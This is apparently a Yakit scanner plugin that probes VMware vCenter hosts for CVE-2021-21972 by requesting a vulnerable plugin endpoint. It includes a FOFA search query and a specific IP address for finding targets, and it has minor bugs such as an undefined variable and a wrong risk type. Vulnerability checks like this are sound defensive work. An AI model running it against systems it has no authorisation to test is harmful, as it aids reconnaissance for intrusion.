# port scan plugin
yakit.AutoInitYakit()
//VM-vCenter-CVE-2021-21972_poc.yak
//（CVE-2021-21972） VM vCenter任意文件上传漏洞复
//默认调用portscan扫描
//fofa 175.47.237.30:80
// app="vmware-vCenter"
// title="+ ID_VC_Welcome +"
handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /ui/vropspluginui/rest/services/getstatus HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: no-cache
Cookie: JSESSIONID=D1A3BC3503E87125CEA20AD1E074A15B; JSESSIONID=24E205FCD7C2345F88B07EE6E092D234
Pragma: no-cache
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        if str.MatchAllOfSubString(header, "HTTP/1.1 200") && str.MatchAllOfSubString(string(body), "Config Final Progress"){
            yakit.Info("%v found CVE-2021-21972） VM vCenter任意文件上传漏洞复", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("CVE-2021-21972"),
            risk.severity("high"),
            risk.titleVerbose("CVE-2021-21972） VM vCenter任意文件上传漏洞复"),
            risk.type("rce[Confluence]"),
            risk.payload(`ui/vropspluginui/rest/services/getstatus`),
            risk.details(string(body)),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
